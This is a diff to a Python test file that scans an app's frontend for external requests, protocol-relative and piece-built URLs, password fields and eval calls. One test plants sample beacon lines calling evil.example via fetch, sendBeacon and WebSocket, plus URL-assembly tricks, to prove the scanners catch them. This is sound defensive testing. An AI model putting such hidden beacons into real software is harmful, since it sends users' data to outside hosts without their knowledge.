@@ -46,15 +46,22 @@ CLICK_ONLY_HOSTS = {
     "www.openstreetmap.org",  # the attribution link on the map while the OpenStreetMap tiles are on
 }
 
-URL_RE = re.compile(r"""https?://[^\s'"`)<>\\]+""", re.IGNORECASE)
+URL_RE = re.compile(r"""\b(?:https?|wss?)://[^\s'"`)<>\\]+""", re.IGNORECASE)
+# //host/... as an attribute or CSS value, or as ANY quoted string (fetch('//host/x'),
+# sendBeacon(`//host`), new WebSocket("//host")): a quote, two slashes and a host name
 PROTOCOL_RELATIVE_RE = re.compile(
-    r"""(?:\b(?:src|href|action)\s*=\s*["']|url\(\s*["']?|@import\s+["'])//[^/\s]""", re.IGNORECASE)
+    r"""(?:\b(?:src|href|action)\s*=\s*["']|url\(\s*["']?|@import\s+["']|["'`])//[A-Za-z0-9\[$]""",
+    re.IGNORECASE)
+# A URL glued together from parts, so that no whole URL appears in the source:
+# `https:${'//'}${host}`, 'wss:' + '//' + host, a bare '//' string
+CONSTRUCTED_URL_RE = re.compile(
+    r"""\b(?:https?|wss?):(?:\$\{|["'`]\s*\+)|["'`]//["'`]|\b(?:https?|wss?)["'`]\s*\+\s*["'`]:""", re.IGNORECASE)
 LOAD_CONTEXT_RE = re.compile(r"""fetch\(|\bsrc\s*=|url\(|@import|<link|<script|XMLHttpRequest""", re.IGNORECASE)
 CSS_COMMENT_RE = re.compile(r"/\*.*?\*/", re.DOTALL)
 
 
-def _frontend_text_files():
-    for path in sorted(FRONTEND.rglob("*")):
+def _frontend_text_files(root=None):
+    for path in sorted((root or FRONTEND).rglob("*")):
         if path.is_file() and path.suffix.lower() in TEXT_SUFFIXES:
             yield path
 
@@ -68,11 +75,34 @@ def _code(path: Path) -> str:
     return text
 
 
-def _external_urls():
-    for path in _frontend_text_files():
+def _external_urls(root=None):
+    root = root or FRONTEND
+    for path in _frontend_text_files(root):
         for lineno, line in enumerate(_code(path).splitlines(), 1):
             for match in URL_RE.finditer(line):
-                yield path.relative_to(FRONTEND), lineno, line, match.group(0)
+                yield path.relative_to(root), lineno, line, match.group(0)
+
+
+def _external_hosts_named(root=None):
+    offending = []
+    for rel, lineno, line, url in _external_urls(root):
+        host = (urlsplit(url).hostname or "").lower()
+        if host in ALLOWED_HOSTS or url in NAMESPACE_URLS or url in ALLOWED_URLS:
+            continue
+        if host in CLICK_ONLY_HOSTS and not LOAD_CONTEXT_RE.search(line):
+            continue
+        offending.append(f"{rel}:{lineno}: {url}")
+    return offending
+
+
+def _lines_matching(regex, root=None):
+    root = root or FRONTEND
+    offending = []
+    for path in _frontend_text_files(root):
+        for lineno, line in enumerate(_code(path).splitlines(), 1):
+            if regex.search(line):
+                offending.append(f"{path.relative_to(root)}:{lineno}: {line.strip()[:120]}")
+    return offending
 
 
 def test_frontend_has_files_to_scan():
@@ -81,24 +111,42 @@ def test_frontend_has_files_to_scan():
 
 
 def test_frontend_names_no_external_hosts():
-    offending = []
-    for rel, lineno, line, url in _external_urls():
-        host = (urlsplit(url).hostname or "").lower()
-        if host in ALLOWED_HOSTS or url in NAMESPACE_URLS or url in ALLOWED_URLS:
-            continue
-        if host in CLICK_ONLY_HOSTS and not LOAD_CONTEXT_RE.search(line):
-            continue
-        offending.append(f"{rel}:{lineno}: {url}")
+    offending = _external_hosts_named()
     assert not offending, "external URLs in the frontend:\n" + "\n".join(offending)
 
 
 def test_frontend_has_no_protocol_relative_urls():
-    offending = []
-    for path in _frontend_text_files():
-        for lineno, line in enumerate(_code(path).splitlines(), 1):
-            if PROTOCOL_RELATIVE_RE.search(line):
-                offending.append(f"{path.relative_to(FRONTEND)}:{lineno}: {line.strip()[:120]}")
+    offending = _lines_matching(PROTOCOL_RELATIVE_RE)
     assert not offending, "\n".join(offending)
+
+
+def test_frontend_builds_no_urls_from_parts():
+    offending = _lines_matching(CONSTRUCTED_URL_RE)
+    assert not offending, "\n".join(offending)
+
+
+def test_the_scan_catches_hidden_external_requests(tmp_path):
+    """PRIV-3: the ways around a plain https:// scan that the audit tried, in a copy of the frontend."""
+    import shutil
+    copy = tmp_path / "frontend"
+    shutil.copytree(FRONTEND, copy, ignore=shutil.ignore_patterns("vendor"))
+    tricks = {
+        "fetch('//evil.example/beacon');": PROTOCOL_RELATIVE_RE,
+        "navigator.sendBeacon(\"//evil.example/b\");": PROTOCOL_RELATIVE_RE,
+        "img.src = `//${host}/pixel.gif`;": PROTOCOL_RELATIVE_RE,
+        "new WebSocket('wss://evil.example/s');": None,
+        "fetch(`https:${'//'}${host}/x`);": CONSTRUCTED_URL_RE,
+        "fetch('https:' + '//' + host);": CONSTRUCTED_URL_RE,
+    }
+    for trick, regex in tricks.items():
+        ui = copy / "ui.js"
+        original = ui.read_text(encoding="utf-8")
+        ui.write_text(original + "\n" + trick + "\n", encoding="utf-8")
+        try:
+            caught = _lines_matching(regex, copy) if regex is not None else _external_hosts_named(copy)
+            assert any("ui.js" in line for line in caught), trick
+        finally:
+            ui.write_text(original, encoding="utf-8")
 
 
 def test_vendored_assets_are_present_with_licenses():
@@ -154,3 +202,17 @@ def test_the_offline_basemap_and_map_libraries_are_vendored_with_licenses():
     for ref in re.findall(r"url\(([^)]+)\)", _code(vendor / "leaflet-1.9.4" / "leaflet.css")):
         if not ref.strip("'\"").startswith(("data:", "#")):
             assert (vendor / "leaflet-1.9.4" / ref.strip("'\"")).resolve().is_file(), ref
+
+
+def test_the_frontend_has_no_password_fields():
+    """PRIV-6: an API key or Client ID is a masked text field; a password field makes Safari offer
+    to save it as a website password (in iCloud Keychain, outside DataVault's own Keychain item)."""
+    offending = _lines_matching(re.compile(r"""\btype\s*=\s*password\b|["'`]password["'`]""", re.IGNORECASE))
+    assert not offending, "\n".join(offending)
+
+
+def test_the_frontend_never_evaluates_strings():
+    """The Content-Security-Policy of the real app has no 'unsafe-eval' (a test server does, for Playwright)."""
+    offending = _lines_matching(re.compile(
+        r"""\beval\(|\bnew\s+Function\(|\bset(?:Timeout|Interval)\(\s*["'`]"""))
+    assert not offending, "\n".join(offending)
